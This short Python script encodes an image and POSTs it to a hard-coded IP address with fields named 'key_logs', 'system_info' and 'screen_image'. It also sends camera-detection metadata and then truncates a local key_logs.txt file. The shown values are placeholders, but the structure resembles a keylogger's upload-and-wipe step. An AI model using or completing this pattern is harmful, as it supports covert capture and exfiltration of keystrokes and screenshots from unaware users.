from datetime import datetime
import requests
import cv2
now = datetime.now()
            # key = convertToBinaryData('./key_logs.txt')
            # system_ip=convertToBinaryData('./system_info.txt')
            # image=convertToBinaryData('./screenshots0.png')
frame=cv2.imread('emre.jpeg')
# cv2.imshow("frame",frame)
# cv2.waitKey(0)

frame=cv2.resize(frame,(848,480))
data2 = cv2.imencode(".jpg", frame)[1]

headers = {'Accept': 'application/json', }
textfile = {

'screen_image': ('image.jpg', data2.tobytes() , 'image/jpeg', {'Expires': '0'}),
'key_logs': "aaaaaaaaaaaaaa",
'system_info':"bbbbbbbbbbbbbbbbbbbbb",

}

data={
        'module_name': "Equipment Control",
'notification_no':"03728",
'proffer':"https://www.mevzuat.gov.tr/File/GeneratePdf?mevzuatNo=16924&mevzuatTur=KurumVeKurulusYonetmeligi&mevzuatTertip=5",

"cam_no":"3",
"date":"2022-04-03 05:57:29",
"status":"detection"
}
try:
    response = requests.post('http://213.226.117.171:8090/api/file', files=textfile,headers=headers,data=data)
    if response.status_code==200:
        f=open('./key_logs.txt','w')
        f.write(" ")
        f.close()   
except:
    pass     